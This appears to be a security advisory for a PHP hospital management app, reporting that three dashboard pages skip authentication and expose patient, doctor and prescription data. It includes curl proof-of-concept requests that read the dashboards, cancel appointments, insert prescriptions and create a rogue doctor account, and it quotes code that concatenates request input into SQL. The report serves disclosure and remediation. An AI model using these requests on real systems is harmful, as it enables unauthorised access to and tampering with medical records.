## Title

`admin-panel.php`, `admin-panel1.php`, and `doctor-panel.php` are reachable without authentication and expose the entire database

### Summary

The three dashboard endpoints only call `session_start()` indirectly through the included `func.php`/`func1.php`/`newfunc.php` files. None of them verifies that `$_SESSION['pid']`, `$_SESSION['username']`, or `$_SESSION['dname']` is set before rendering the page. Any unauthenticated HTTP client can therefore load the full patient/doctor/appointment/prescription/contact datasets and trigger admin-level actions (cancel appointment, add/delete doctor, insert prescription).

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Improper Authentication (CWE-287) / Missing Authentication for Critical Function (CWE-306)

### Affected Code

File: `admin-panel.php`

```php
include('func.php');
include('newfunc.php');
$con=mysqli_connect("localhost","root","","myhmsdb");
$pid = $_SESSION['pid'];
$username = $_SESSION['username'];
...
if(isset($_POST['app-submit'])){ ... }
if(isset($_GET['cancel'])) {
    $query=mysqli_query($con,"update appointmenttb set userStatus='0' where ID = '".$_GET['ID']."'");
    ...
}
```

File: `admin-panel1.php`

```php
include('newfunc.php');
$con=mysqli_connect("localhost","root","","myhmsdb");
// renders the full Doctor List, Patient List, Appointment List, Prescription List, Queries tab
```

File: `doctor-panel.php`

```php
include('func1.php');
$con=mysqli_connect("localhost","root","","myhmsdb");
$doctor = $_SESSION['dname'];
if(isset($_GET['cancel'])) {
    $query=mysqli_query($con,"update appointmenttb set doctorStatus='0' where ID = '".$_GET['ID']."'");
}
```

### Root Cause

The login handlers (`func.php`, `func1.php`, `func3.php`) populate `$_SESSION` only after a successful `SELECT` from `patreg`, `doctb`, or `admintb`. The dashboard endpoints never check whether the session is populated; they simply read `$_SESSION['pid']` / `$_SESSION['dname']` (which silently default to `null` when the session is empty) and then display the data. There is no `if (!isset($_SESSION[...])) { header('Location: index.php'); exit; }` guard anywhere.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Request the receptionist dashboard without any cookies. The full dashboard is returned.

```bash
curl -sS -i "$BASE_URL/admin-panel1.php" | head -10
```

```text
HTTP/1.1 200 OK
...
Set-Cookie: PHPSESSID=...
```

The body contains the full Doctor List, Patient List (with plaintext passwords), Appointment List, Prescription List, and Queries tab.

3. Request the patient dashboard without any cookies. The full dashboard is returned.

```bash
curl -sS -i "$BASE_URL/admin-panel.php" | head -10
```

```text
HTTP/1.1 200 OK
...
```

4. Request the doctor dashboard without any cookies. The full dashboard is returned.

```bash
curl -sS -i "$BASE_URL/doctor-panel.php" | head -10
```

```text
HTTP/1.1 200 OK
...
```

5. Trigger the privileged cancellation action without any cookies.

```bash
curl -sS "$BASE_URL/admin-panel.php?ID=1&cancel=update" | grep -E "alert|appoint"
```

```text
<script>alert('Your appointment successfully cancelled');</script>
```

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT ID,userStatus FROM appointmenttb WHERE ID=1;"
```

```text
ID  userStatus
1   0
```

The appointment was cancelled without any user being logged in.

6. Trigger the privileged prescription insert without any cookies.

```bash
curl -sS "$BASE_URL/prescribe.php" \
  --data-urlencode "prescribe=1" \
  --data-urlencode "pid=4" \
  --data-urlencode "ID=1" \
  --data-urlencode "fname=Test" \
  --data-urlencode "lname=Patient" \
  --data-urlencode "appdate=2020-01-01" \
  --data-urlencode "apptime=10:00:00" \
  --data-urlencode "disease=Test" \
  --data-urlencode "allergy=Test" \
  --data-urlencode "prescription=Test"
```

```text
<script>alert('Prescribed successfully!');</script>
```

7. Add a new doctor without any cookies.

```bash
curl -sS "$BASE_URL/admin-panel1.php" \
  --data-urlencode "docsub=1" \
  --data-urlencode "doctor=evil" \
  --data-urlencode "dpassword=evil123" \
  --data-urlencode "demail=evil@evil.com" \
  --data-urlencode "special=General" \
  --data-urlencode "docFees=1"
```

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT username,password FROM doctb WHERE email='evil@evil.com';"
```

```text
username  password
evil      evil123
```

### Impact

The missing authentication check on the dashboard endpoints means that the entire staff surface of the application is publicly accessible. An unauthenticated attacker can:

- Dump every patient, doctor, appointment, prescription, and contact record;
- Cancel any appointment on behalf of any patient or doctor;
- Insert prescriptions attributed to any doctor;
- Add or delete doctor accounts (the receptionist-only action);
- Combine this with the CSRF primitive (CVE-14) to force an authenticated receptionist browser to execute the same actions.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)
```
